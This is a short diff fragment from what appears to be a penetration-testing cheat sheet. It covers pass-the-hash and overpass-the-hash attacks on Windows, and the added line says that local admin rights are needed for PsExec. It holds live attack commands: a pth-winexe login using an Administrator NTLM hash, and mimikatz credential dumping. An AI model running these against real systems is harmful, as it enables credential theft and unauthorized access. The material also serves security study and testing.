@@ -233,6 +233,7 @@ $ pth-winexe -U Administrator%NTLMhash //10.1.1.1 cmd
 
 Overpass-the-Hash
 * "over" abuse a NTLM hash to gain a full Kerberos TGT or Service Ticket.
+* Requires local admin permissions on target to run PSEXEC.EXE
 ```
 # obtain NTLM hash
 mimikatz > sekurlsa::logonpasswords
